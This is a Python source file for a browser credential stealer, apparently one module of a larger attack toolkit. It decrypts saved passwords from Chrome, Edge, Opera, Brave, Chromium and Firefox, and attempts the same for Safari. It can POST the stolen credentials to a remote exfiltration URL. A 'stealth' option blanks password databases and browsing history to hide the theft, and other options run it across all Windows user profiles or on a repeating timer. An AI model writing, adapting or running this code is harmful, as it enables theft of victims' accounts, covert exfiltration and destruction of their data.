"""
browser_pass_ext.py

Extracts saved browser passwords from Chrome, Edge, Firefox, and Opera on Windows, Linux, and macOS.
Supports:
  - Chrome/Edge/Opera: Decrypts 'Login Data' SQLite DB using OS-specific key extraction.
  - Firefox: Extracts logins.json and key4.db, decrypts using NSS.
  - Optional: Exfiltrate results via HTTP POST or write to disk.
  - Multi-user and multi-profile support.
  - Stealth: clears browser history and password DBs after extraction (dangerous).
"""

import os
import sys
import shutil
import sqlite3
import json
import base64
import glob
import logging
import tempfile
import platform
from pathlib import Path
from modules.logger import log_event

logger = logging.getLogger("browser_pass_ext")

def get_chrome_key_windows():
    try:
        import win32crypt
        import json
        import subprocess
        local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        import ctypes
        import ctypes.wintypes
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.create_string_buffer(encrypted_key), ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()
        ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        )
        key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        return key
    except Exception as e:
        logger.error(f"Failed to get Chrome key (Windows): {e}")
        return None

def decrypt_chrome_password(ciphertext, key):
    try:
        from Cryptodome.Cipher import AES
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode()
        else:
            # Older DPAPI
            import win32crypt
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
    except Exception as e:
        logger.error(f"Failed to decrypt Chrome password: {e}")
        return ""

def get_chrome_key_linux():
    try:
        # Chrome/Chromium on Linux uses a key stored in GNOME Keyring or KWallet
        import secretstorage
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                return item.get_secret()
    except Exception as e:
        logger.error(f"Failed to get Chrome key (Linux): {e}")
    return None

def get_chrome_key_macos():
    try:
        import keyring
        return keyring.get_password('Chrome Safe Storage', 'Chrome')
    except Exception as e:
        logger.error(f"Failed to get Chrome key (macOS): {e}")
    return None

def extract_chrome_passwords():
    results = []
    system = platform.system()
    if system == "Windows":
        key = get_chrome_key_windows()
        user_data_dir = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")
        profiles = [p for p in Path(user_data_dir).glob("*") if (p / "Login Data").exists()]
        for prof in profiles:
            db_path = prof / "Login Data"
            tmp_db = tempfile.mktemp()
            shutil.copy2(db_path, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in c.fetchall():
                    url, user, pwd = row
                    pwd = decrypt_chrome_password(pwd, key)
                    results.append({"profile": str(prof), "url": url, "username": user, "password": pwd})
                conn.close()
            except Exception as e:
                logger.error(f"Chrome DB error: {e}")
            finally:
                os.remove(tmp_db)
    elif system == "Linux":
        key = get_chrome_key_linux()
        user_data_dir = os.path.expanduser("~/.config/google-chrome")
        profiles = [p for p in Path(user_data_dir).glob("*") if (p / "Login Data").exists()]
        for prof in profiles:
            db_path = prof / "Login Data"
            tmp_db = tempfile.mktemp()
            shutil.copy2(db_path, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in c.fetchall():
                    url, user, pwd = row
                    # Linux Chrome passwords are usually not encrypted if no keyring is present
                    try:
                        pwd = decrypt_chrome_password(pwd, key) if key else pwd.decode()
                    except Exception:
                        pwd = pwd.decode(errors='ignore')
                    results.append({"profile": str(prof), "url": url, "username": user, "password": pwd})
                conn.close()
            except Exception as e:
                logger.error(f"Chrome DB error: {e}")
            finally:
                os.remove(tmp_db)
    elif system == "Darwin":
        key = get_chrome_key_macos()
        user_data_dir = os.path.expanduser("~/Library/Application Support/Google/Chrome")
        profiles = [p for p in Path(user_data_dir).glob("*") if (p / "Login Data").exists()]
        for prof in profiles:
            db_path = prof / "Login Data"
            tmp_db = tempfile.mktemp()
            shutil.copy2(db_path, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in c.fetchall():
                    url, user, pwd = row
                    try:
                        pwd = decrypt_chrome_password(pwd, key) if key else pwd.decode()
                    except Exception:
                        pwd = pwd.decode(errors='ignore')
                    results.append({"profile": str(prof), "url": url, "username": user, "password": pwd})
                conn.close()
            except Exception as e:
                logger.error(f"Chrome DB error: {e}")
            finally:
                os.remove(tmp_db)
    # Chromium, Edge, Opera, Brave use similar storage locations
    # Add support for those browsers
    browser_variants = {
        "Chromium": {
            "Windows": r"%LOCALAPPDATA%\\Chromium\\User Data",
            "Linux": "~/.config/chromium",
            "Darwin": "~/Library/Application Support/Chromium"
        },
        "Edge": {
            "Windows": r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
            "Linux": "~/.config/microsoft-edge",
            "Darwin": "~/Library/Application Support/Microsoft Edge"
        },
        "Opera": {
            "Windows": r"%APPDATA%\\Opera Software\\Opera Stable",
            "Linux": "~/.config/opera",
            "Darwin": "~/Library/Application Support/com.operasoftware.Opera"
        },
        "Brave": {
            "Windows": r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data",
            "Linux": "~/.config/BraveSoftware/Brave-Browser",
            "Darwin": "~/Library/Application Support/BraveSoftware/Brave-Browser"
        }
    }
    for browser, paths in browser_variants.items():
        bdir = os.path.expandvars(paths.get(system, ""))
        bdir = os.path.expanduser(bdir)
        if not os.path.exists(bdir):
            continue
        profiles = [p for p in Path(bdir).glob("*") if (p / "Login Data").exists()]
        for prof in profiles:
            db_path = prof / "Login Data"
            tmp_db = tempfile.mktemp()
            shutil.copy2(db_path, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in c.fetchall():
                    url, user, pwd = row
                    try:
                        pwd = decrypt_chrome_password(pwd, key) if key else pwd.decode()
                    except Exception:
                        pwd = pwd.decode(errors='ignore')
                    results.append({"browser": browser, "profile": str(prof), "url": url, "username": user, "password": pwd})
                conn.close()
            except Exception as e:
                logger.error(f"{browser} DB error: {e}")
            finally:
                os.remove(tmp_db)
    return results

# Safari support (macOS only)
def extract_safari_passwords():
    results = []
    if platform.system() != "Darwin":
        return results
    try:
        import keyring
        # Safari stores passwords in Keychain
        # This will list all internet passwords
        from subprocess import check_output
        out = check_output(["security", "find-internet-password", "-g"], timeout=10).decode()
        # Parsing output is left as an exercise (Keychain is complex)
        # For demo, just log that extraction was attempted
        logger.info("Safari password extraction attempted (Keychain parsing not fully implemented)")
    except Exception as e:
        logger.error(f"Safari extraction error: {e}")
    return results

def extract_firefox_passwords():
    results = []
    try:
        import keyring
        import getpass
        from subprocess import check_output
        # Find Firefox profiles
        if platform.system() == "Windows":
            base = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
        elif platform.system() == "Darwin":
            base = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
        else:
            base = os.path.expanduser("~/.mozilla/firefox")
        for prof in Path(base).glob("*.default*"):
            logins = prof / "logins.json"
            key4 = prof / "key4.db"
            if logins.exists() and key4.exists():
                # Use external tool (firefox_decrypt or similar) for real-world attacks
                try:
                    out = check_output(["firefox_decrypt", "-d", str(prof)], timeout=20).decode()
                    for line in out.splitlines():
                        if line.startswith("Site:"):
                            url = line.split(":",1)[1].strip()
                        elif line.startswith("Username:"):
                            user = line.split(":",1)[1].strip()
                        elif line.startswith("Password:"):
                            pwd = line.split(":",1)[1].strip()
                            results.append({"profile": str(prof), "url": url, "username": user, "password": pwd})
                except Exception as e:
                    logger.error(f"firefox_decrypt failed: {e}")
    except Exception as e:
        logger.error(f"Firefox extraction error: {e}")
    return results

def extract_all_browser_passwords(stealth: bool = False, exfil_url: str = None):
    """
    Extracts all browser passwords from all supported browsers.
    If stealth=True, clears browser history and password DBs after extraction.
    If exfil_url is set, POSTs results to remote server.
    """
    all_results = []
    all_results += extract_chrome_passwords()
    all_results += extract_firefox_passwords()
    all_results += extract_safari_passwords()
    log_event("browser_pass_ext", f"Extracted {len(all_results)} passwords".encode())
    if exfil_url and all_results:
        try:
            import requests
            requests.post(exfil_url, json=all_results, timeout=10)
            log_event("browser_pass_ext", b"Exfiltrated browser passwords via HTTP POST.")
        except Exception as e:
            logger.error(f"Exfiltration failed: {e}")
    if stealth:
        try:
            # Wipe browser Login Data and history for all supported browsers
            system = platform.system()
            # Chrome/Chromium/Edge/Opera/Brave
            browser_dirs = [
                os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
                os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
                os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
                os.path.expandvars(r"%APPDATA%\\Opera Software\\Opera Stable"),
                os.path.expandvars(r"%LOCALAPPDATA%\\Chromium\\User Data")
            ]
            if system == "Linux":
                browser_dirs = [
                    os.path.expanduser("~/.config/google-chrome"),
                    os.path.expanduser("~/.config/chromium"),
                    os.path.expanduser("~/.config/microsoft-edge"),
                    os.path.expanduser("~/.config/opera"),
                    os.path.expanduser("~/.config/BraveSoftware/Brave-Browser")
                ]
            elif system == "Darwin":
                browser_dirs = [
                    os.path.expanduser("~/Library/Application Support/Google/Chrome"),
                    os.path.expanduser("~/Library/Application Support/Chromium"),
                    os.path.expanduser("~/Library/Application Support/Microsoft Edge"),
                    os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera"),
                    os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser")
                ]
            for bdir in browser_dirs:
                if not os.path.exists(bdir):
                    continue
                for prof in Path(bdir).glob("*"):
                    for f in ["Login Data", "History"]:
                        fp = prof / f
                        if fp.exists():
                            open(fp, "w").close()
            # Firefox
            if system == "Windows":
                base = os.path.expandvars(r"%APPDATA%\\Mozilla\\Firefox\\Profiles")
            elif system == "Darwin":
                base = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
            else:
                base = os.path.expanduser("~/.mozilla/firefox")
            for prof in Path(base).glob("*.default*"):
                for f in ["logins.json", "key4.db", "places.sqlite"]:
                    fp = prof / f
                    if fp.exists():
                        open(fp, "w").close()
            # Safari (macOS)
            if system == "Darwin":
                # No direct file wipe, but could clear Keychain entries (not implemented)
                logger.info("Safari stealth wipe attempted (Keychain wipe not implemented)")
            log_event("browser_pass_ext", b"Stealth wipe of browser Login Data and History.")
        except Exception as e:
            logger.error(f"Stealth wipe failed: {e}")
    return all_results

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Browser Password Extractor (Enhanced)")
    parser.add_argument("--stealth", action="store_true", help="Wipe browser DBs after extraction")
    parser.add_argument("--exfil_url", help="Exfiltrate results to remote HTTP endpoint")
    parser.add_argument("--outfile", help="Write results to file (JSON)")
    parser.add_argument("--mass", action="store_true", help="Extract from all supported browsers/profiles/users aggressively")
    parser.add_argument("--loop", type=int, default=0, help="Repeat extraction every N seconds (0=once)")
    args = parser.parse_args()

    def run_extract():
        results = extract_all_browser_passwords(stealth=args.stealth, exfil_url=args.exfil_url)
        print(f"[+] Extracted {len(results)} credentials")
        for r in results:
            print(r)
        if args.outfile:
            try:
                with open(args.outfile, "w", encoding="utf-8") as f:
                    json.dump(results, f, indent=2)
                print(f"[+] Results written to {args.outfile}")
            except Exception as e:
                print(f"[!] Failed to write outfile: {e}")

    if args.mass and platform.system() == "Windows":
        # Dangerous: try to extract from all user profiles
        user_profiles = [p for p in Path("C:/Users").glob("*") if (p / "AppData/Local/Google/Chrome/User Data").exists()]
        for user in user_profiles:
            os.environ["LOCALAPPDATA"] = str(user / "AppData/Local")
            print(f"[+] Extracting for user: {user}")
            run_extract()
    elif args.loop > 0:
        import time
        while True:
            run_extract()
            print(f"[+] Sleeping {args.loop}s before next extraction ...")
            time.sleep(args.loop)
    else:
        run_extract()
